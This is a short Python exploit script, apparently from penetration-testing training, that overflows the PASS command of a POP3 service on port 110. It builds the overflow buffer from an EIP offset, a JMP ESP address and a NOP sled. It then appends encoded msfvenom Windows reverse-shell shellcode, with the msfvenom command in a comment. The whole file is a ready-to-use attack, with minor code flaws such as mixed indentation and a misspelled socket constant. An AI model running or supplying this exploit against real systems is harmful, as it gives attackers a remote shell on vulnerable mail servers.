#!/usr/bin/python

# Created by TJnull

import socket
import struct 

RHOST = "10.11.24.169"    #String
RPORT = 110               #integer

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM_)

buf_totlen = 3500         #integer
offset_eip = 2606         #integer
ptr_jmp_esp = 0x5F4A358F  # hex integer (0x<mem>)

#msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f c -a x86 --platform windows -b "\x00\x0A\x0D" -e x86/shikata_ga_nai
#bad char list \x00\x0A\x0D (cfr file 5)
shellcode = ("\xbd\xb9\xbc\xa4\xea\xdb\xde\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x6b\x0e\x03\xd2\xb2\x46\x1f\xd8\x23\x04"
"\xe0\x20\xb4\x69\x68\xc5\x85\xa9\x0e\x8e\xb6\x19\x44\xc2\x3a"
"\xd1\x08\xf6\xc9\x97\x84\xf9\x7a\x1d\xf3\x34\x7a\x0e\xc7\x57"
"\xf8\x4d\x14\xb7\xc1\x9d\x69\xb6\x06\xc3\x80\xea\xdf\x8f\x37"
"\x1a\x6b\xc5\x8b\x91\x27\xcb\x8b\x46\xff\xea\xba\xd9\x8b\xb4"
"\x1c\xd8\x58\xcd\x14\xc2\xbd\xe8\xef\x79\x75\x86\xf1\xab\x47"
"\x67\x5d\x92\x67\x9a\x9f\xd3\x40\x45\xea\x2d\xb3\xf8\xed\xea"
"\xc9\x26\x7b\xe8\x6a\xac\xdb\xd4\x8b\x61\xbd\x9f\x80\xce\xc9"
"\xc7\x84\xd1\x1e\x7c\xb0\x5a\xa1\x52\x30\x18\x86\x76\x18\xfa"
"\xa7\x2f\xc4\xad\xd8\x2f\xa7\x12\x7d\x24\x4a\x46\x0c\x67\x03"
"\xab\x3d\x97\xd3\xa3\x36\xe4\xe1\x6c\xed\x62\x4a\xe4\x2b\x75"
"\xad\xdf\x8c\xe9\x50\xe0\xec\x20\x97\xb4\xbc\x5a\x3e\xb5\x56"
"\x9a\xbf\x60\xf8\xca\x6f\xdb\xb9\xba\xcf\x8b\x51\xd0\xdf\xf4"
"\x42\xdb\x35\x9d\xe9\x26\xde\xa8\xe6\x28\xad\xc5\xfa\x28\xf2"
"\x97\x72\xce\x9e\x87\xd2\x59\x37\x31\x7f\x11\xa6\xbe\x55\x5c"
"\xe8\x35\x5a\xa1\xa7\xbd\x17\xb1\x50\x4e\x62\xeb\xf7\x51\x58"
"\x83\x94\xc0\x07\x53\xd2\xf8\x9f\x04\xb3\xcf\xe9\xc0\x29\x69"
"\x40\xf6\xb3\xef\xab\xb2\x6f\xcc\x32\x3b\xfd\x68\x11\x2b\x3b"
"\x70\x1d\x1f\x93\x27\xcb\xc9\x55\x9e\xbd\xa3\x0f\x4d\x14\x23"
"\xc9\xbd\xa7\x35\xd6\xeb\x51\xd9\x67\x42\x24\xe6\x48\x02\xa0"
"\x9f\xb4\xb2\x4f\x4a\x7d\xc2\x05\xd6\xd4\x4b\xc0\x83\x64\x16"
"\xf3\x7e\xaa\x2f\x70\x8a\x53\xd4\x68\xff\x56\x90\x2e\xec\x2a"
"\x89\xda\x12\x98\xaa\xce")

buffer = "A"*offset_eip
buffer += struct.pack("<I", ptr_jmp_esp)
buffer += "\x90" * 16 #nopsled
buffer += shellcode
buffer += "C"*(buf_totlen - len(buffer))

try:
    print "\nSending buffer (╯°□°）╯︵ ┻━┻ "
	s.connect((RHOST, RPORT))
	s.recv(1024)
	s.send('USER username' + '\r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3! ¯\_(ツ)_/¯"